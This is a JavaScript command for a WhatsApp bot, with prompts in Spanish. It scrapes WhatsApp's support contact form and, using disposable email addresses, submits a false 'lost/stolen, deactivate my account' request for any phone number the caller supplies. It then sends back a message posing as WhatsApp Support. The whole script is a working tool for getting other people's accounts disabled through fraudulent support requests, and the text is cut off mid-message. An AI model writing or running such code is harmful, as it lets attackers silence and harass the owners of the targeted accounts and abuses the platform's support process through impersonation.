import cheerio from 'cheerio';
import axios from 'axios';
import util from 'util';

const handler = async (m, {conn, isOwner, usedPrefix, command, args}) => {
  const q = args.join(' ');

  // Verificación de si no se pasa un número
  if (!q || !args[0]) {
    return m.reply('*[ ℹ️ ] Ingrese el número que desee desactivar en formato internacional.*\n\n[ 💡 ] Ejemplo:* .soporte +1 (450) 555-555');
  }

  // Continuación del proceso si se pasó un número
  const ntah = await axios.get('https://www.whatsapp.com/contact/noclient/');
  const email = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10');
  const cookie = ntah.headers['set-cookie'].join('; ');
  const $ = cheerio.load(ntah.data);
  const $form = $('form');
  const url = new URL($form.attr('action'), 'https://www.whatsapp.com').href;
  const form = new URLSearchParams();
  form.append('jazoest', $form.find('input[name=jazoest]').val());
  form.append('lsd', $form.find('input[name=lsd]').val());
  form.append('step', 'submit');
  form.append('country_selector', 'ID');
  form.append('phone_number', q);
  form.append('email', email.data[0]);
  form.append('email_confirm', email.data[0]);
  form.append('platform', 'ANDROID');
  form.append('your_message', 'Perdido/roubado: desative minha conta: ' + q);
  form.append('__user', '0');
  form.append('__a', '1');
  form.append('__csr', '');
  form.append('__req', '8');
  form.append('__hs', '19316.BP:whatsapp_www_pkg.2.0.0.0.0');
  form.append('dpr', '1');
  form.append('__ccg', 'UNKNOWN');
  form.append('__rev', '1006630858');
  form.append('__comment_req', '0');

  const res = await axios({url, method: 'POST', data: form, headers: {cookie}});
  const payload = String(res.data);

  if (payload.includes(`"payload":true`)) {
    m.reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes